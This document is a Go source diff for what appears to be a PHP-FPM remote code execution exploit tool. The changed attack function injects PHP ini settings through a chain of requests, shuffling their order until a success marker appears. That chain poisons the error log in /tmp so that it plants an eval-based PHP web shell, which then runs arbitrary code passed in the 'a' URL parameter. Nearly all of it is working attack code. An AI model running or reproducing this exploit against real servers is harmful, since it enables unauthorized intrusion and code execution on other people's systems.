@@ -3,56 +3,61 @@ package main
 import (
 	"bytes"
 	"log"
+	"math/rand"
+	"net/http"
 	"net/url"
+	"time"
 )
 
-var chain = []string{
-	"short_open_tag=1",
-	"html_errors=0",
-	"include_path=/tmp",
-	"auto_prepend_file=a",
-	"log_errors=1",
-	"error_reporting=2",
-	"error_log=/tmp/a",
-	"extension_dir=\"<?=`\"",
-	"extension=\"$_GET[a]`?>\"",
+var (
+	successPattern = "3422557222"
+	codeParams     = url.Values{
+		"a": []string{
+			`file_put_contents('/tmp/l.php','<?php eval($_GET["a"]);return;?>');echo 0xdeadbeef-313371337;`},
+		"v": []string{`<?eval($_GET['a']);?>`},
+	}.Encode() + "&"
+)
+
+func init() {
+	rand.Seed(time.Now().UnixNano())
 }
 
-const (
-	checkCommand   = `a=/bin/sh+-c+'which+which'&` // must not contain any chars that are encoded (except space)
-	successPattern = "/bin/which"
-	cleanupCommand = ";echo '<?php echo `$_GET[a]`;return;?>'>/tmp/a;which which"
-)
-
-func Attack(requester *Requester, params *AttackParams) error {
+func Attack(o *Overrider) error {
 	log.Printf("Performing attack using php.ini settings...")
+
+	chain := []*struct {
+		Set     func(string, string) (*http.Response, []byte, error)
+		Payload string
+	}{
+		{o.PHPValue, "short_open_tag=1;;;.php"},
+		{o.PHPValue, "html_errors=0;;;;;;.php"},
+		{o.PHPValue, "include_path=/tmp;;.php"},
+		{o.PHPValue, "auto_prepend_file=l.php"},
+		{o.PHPValue, "log_errors=1;;;;;;;.php"},
+		{o.PHPValue, "error_reporting=10;.php"},
+		{o.PHPValue, "   error_log=/tmp/l.php"},
+		{o.RequestBodyFile, `<?${$_GET/*.php`},
+		{o.RequestBodyFile, `*/["v"]}?>x.php`},
+	}
 
 attackLoop:
 	for {
-		for _, payload := range chain {
-			_, body, err := SetSettingSingle(requester, params, payload, checkCommand)
+		for _, item := range chain {
+			_, body, err := item.Set(item.Payload, codeParams)
 			if err != nil {
 				return err
 			}
 			if bytes.Contains(body, []byte(successPattern)) {
-				log.Printf(`Success! Was able to execute a command by appending "?%s" to URLs`, checkCommand)
+				log.Printf(`Success! Should be able to execute a command by appending "?a=<php code>" to URLs`)
 				break attackLoop
 			}
 		}
 
-	}
-
-	log.Printf("Trying to cleanup /tmp/a...")
-	cleanup := url.Values{"a": []string{cleanupCommand}}
-	for {
-		_, body, err := requester.RequestWithQueryStringPrefix("/", params, cleanup.Encode()+"&")
-		if err != nil {
-			return err
-		}
-		if bytes.Contains(body, []byte(successPattern)) {
-			log.Print("Done!")
-			break
-		}
+		rand.Shuffle(len(chain), func(i, j int) {
+			t := chain[i]
+			chain[i] = chain[j]
+			chain[j] = t
+		})
 	}
 	return nil
 }
